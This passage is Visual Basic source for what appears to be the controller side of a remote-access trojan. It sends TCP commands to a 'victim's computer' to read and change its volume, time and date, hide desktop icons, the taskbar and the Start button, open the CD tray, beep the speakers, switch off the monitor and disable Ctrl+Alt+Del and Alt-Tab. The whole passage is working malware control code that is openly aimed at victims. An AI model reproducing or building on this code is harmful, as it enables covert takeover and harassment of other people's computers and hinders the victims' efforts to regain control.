     TCPClient.SendData Index & VolumeSlider_27(Index).Value
     DoEvents
  End If
  If Index = 3 Then
     lblAction.Caption = "Read current volume settings on victim's computer."
     txtAction.text = "SOUNDREAD_27"
     TCPClient.SendData "SOUNDREAD_27"
  End If
End Sub

Private Sub CheckMute_27_Click()
If CheckMute_27.Value = 1 Then 'checked, to mute
   lblAction.Caption = "Mute the sound on victim's computer."
   TCPClient.SendData "3SOUND_27"
ElseIf CheckMute_27.Value = 0 Then 'unchecked, to unmute
   lblAction.Caption = "Unmute the sound on victim's computer."
   TCPClient.SendData "4SOUND_27"
End If
End Sub

Private Sub ReadSoundSetting_27(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
For i = 0 To i
    VolumeSlider_27(i).Value = CLng(Info(i))
    Info(i) = ""
Next i
End Sub

'Function 28
Private Sub cmdTimeDate_28_Click(Index As Integer)
Select Case Index
    Case 0 'set time
         If checkTime Then
            lblAction.Caption = "Set time on victim's computer."
            TCPClient.SendData "0TIMEDATE_28"
            DoEvents
            Sleep 200
            TCPClient.SendData "0" & Delimiter & txtTime_28(0).text & Delimiter & txtTime_28(1).text & Delimiter & cbTime_28.text & Delimiter
         End If
    Case 1 'set date
         If checkDate Then
            lblAction.Caption = "Set date on victim's computer."
            TCPClient.SendData "1TIMEDATE_28"
            DoEvents
            Sleep 200
            TCPClient.SendData "1" & Delimiter & txtDate_28.text & Delimiter
         End If
    Case 2 'get time & date
         lblAction.Caption = "Get current time and date on victim's computer."
         txtAction.text = "2TIMEDATE_28"
         TCPClient.SendData "2TIMEDATE_28"
End Select
End Sub

Function checkTime() As Boolean
txtTime_28(0).text = Trim(txtTime_28(0).text)
txtTime_28(1).text = Trim(txtTime_28(1).text)
If IsNumeric(txtTime_28(0).text) And IsNumeric(txtTime_28(1).text) And cbTime_28.text <> "" _
   And Int(txtTime_28(0).text) > 0 And Int(txtTime_28(0).text) <= 12 _
     And Int(txtTime_28(1).text) >= 0 And Int(txtTime_28(1).text) <= 59 Then
     checkTime = True
  Else
    GoTo ErrorTime
End If

Exit Function
ErrorTime:
MsgBox "Please input correct.", vbExclamation, "Time"
checkTime = False
End Function

Function checkDate() As Boolean
  txtDate_28.text = Trim(txtDate_28.text)
  If IsDate(txtDate_28.text) Then
     checkDate = True
  Else
     MsgBox "Please input correct.", vbExclamation, "Date"
     checkDate = False
  End If
End Function

Private Sub GetTimeDate_28(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
txtTime_28(0).text = Info(0) 'hr
txtTime_28(1).text = Info(1) 'min
cbTime_28.text = Info(2)     'AM or PM
txtDate_28.text = Info(3)    'date
For i = 0 To i
    Info(i) = ""
Next i
End Sub

Private Sub txtTime_28_KeyPress(Index As Integer, KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

'Function 29
Private Sub cmdExtra_29_Click(Index As Integer)
Select Case Index
    Case 0
         lblAction.Caption = "Hide the victim's Desktop icons."
         TCPClient.SendData "00EXTRA_29"
    Case 1
         lblAction.Caption = "Show the victim's Desktop icons."
         TCPClient.SendData "01EXTRA_29"
    Case 2
         lblAction.Caption = "Hide the Start button on the victim's screen."
         TCPClient.SendData "02EXTRA_29"
    Case 3
         lblAction.Caption = "Show the Start button on the victim's screen."
         TCPClient.SendData "03EXTRA_29"
    Case 4
         lblAction.Caption = "Hide the victim's Taskbar."
         TCPClient.SendData "04EXTRA_29"
    Case 5
         lblAction.Caption = "Show the victim's Taskbar."
         TCPClient.SendData "05EXTRA_29"
    Case 6
         lblAction.Caption = "Open the victim's CD-rom door."
         TCPClient.SendData "06EXTRA_29"
    Case 7
         lblAction.Caption = "Close the victim's CD-rom door."
         TCPClient.SendData "07EXTRA_29"
    Case 8
         lblAction.Caption = "Start a beeping in the victim's speakers."
         TCPClient.SendData "08EXTRA_29"
    Case 9
         lblAction.Caption = "Stop a beeping in the victim's speakers."
         TCPClient.SendData "09EXTRA_29"
    Case 10
         lblAction.Caption = "Turn on the victim's monitor."
         TCPClient.SendData "10EXTRA_29"
    Case 11
         lblAction.Caption = "Turn off the victim's monitor."
         TCPClient.SendData "11EXTRA_29"
    Case 12
         lblAction.Caption = "Turn on the Ctrl+Alt+Del and the Alt-Tab on the victim's computer."
         TCPClient.SendData "12EXTRA_29"
    Case 13
         lblAction.Caption = "Turn off the Ctrl+Alt+Del and the Alt-Tab on the victim's computer."
         TCPClient.SendData "13EXTRA_29"
    Case 14
         lblAction.Caption = "Turn on the Scroll Lock on the victim's computer."
         TCPClient.SendData "14EXTRA_29"
    Case 15
         lblAction.Caption = "Turn off the Scroll Lock on the victim's computer."
         TCPClient.SendData "15EXTRA_29"
    Case 16
         lblAction.Caption = "Turn on the Caps Lock on the victim's computer."
         TCPClient.SendData "16EXTRA_29"
    Case 17
         lblAction.Caption = "Turn off the Caps Lock on the victim's computer."
         TCPClient.SendData "17EXTRA_29"
    Case 18
         lblAction.Caption = "Turn on the Num Lock on the victim's computer."
         TCPClient.SendData "18EXTRA_29"
    Case 19
         lblAction.Caption = "Turn off the Num Lock on the victim's computer."
         TCPClient.SendData "19EXTRA_29"
End Select
End Sub
'***********************************************************
'End - Function (29)
'***********************************************************

